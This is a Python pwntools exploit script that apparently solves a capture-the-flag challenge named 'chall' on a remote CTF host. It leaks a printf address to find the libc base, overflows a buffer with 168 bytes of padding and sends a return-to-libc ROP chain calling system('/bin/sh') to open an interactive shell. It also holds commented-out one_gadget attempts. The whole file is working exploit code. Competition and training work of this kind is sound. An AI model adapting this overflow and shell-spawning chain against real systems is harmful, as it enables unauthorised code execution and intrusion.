#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./chall')

host = args.HOST or 'twisty_track.ctf.fifthdoma.in'
port = int(args.PORT or 9999)

if not args.REMOTE:
    libc = exe.libc
else:
    libc = ELF('./libc6_2.31-12_amd64.so')

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())
#b *fun + 189



p = start()
p.recvline()

toleak = b"seekinghelp"
p.sendline(toleak)
leak = int(p.recvline().strip()[2:],16)
log.info(f"printf leak @ {hex(leak)}")

if not args.REMOTE:
    libc.address = leak - 0x05fd90
else:
    libc.address = leak - 0x056cf0

log.info(f"libc base @ {hex(libc.address)}")

if not args.REMOTE:
    pop_rdi = libc.address + 0x2858f
    ret = libc.address + 0xbc6d9
    pop_rsi = libc.address + 0x2ac3f
    pop_r12 = libc.address + 0x34189 
    one_gadget = libc.address + 0xdf54c
else:
    pop_rdi = libc.address + 0x26796
    ret = libc.address + 0xa838f
    pop_rsi = libc.address + 0x2890f
    pop_r12 = libc.address + 0x26e9a
    one_gadget = libc.address + 0xcbd1d

# none of the above like to work remotely

payload = b"A" * 168
#payload += p64(ret)
#payload += p64(pop_r12)
#payload += p64(0)
#payload += p64(one_gadget)
payload += p64(pop_rdi)
payload += p64(libc.search(b"/bin/sh").__next__())
payload += p64(libc.symbols['system'])
p.sendline(payload)

p.interactive()

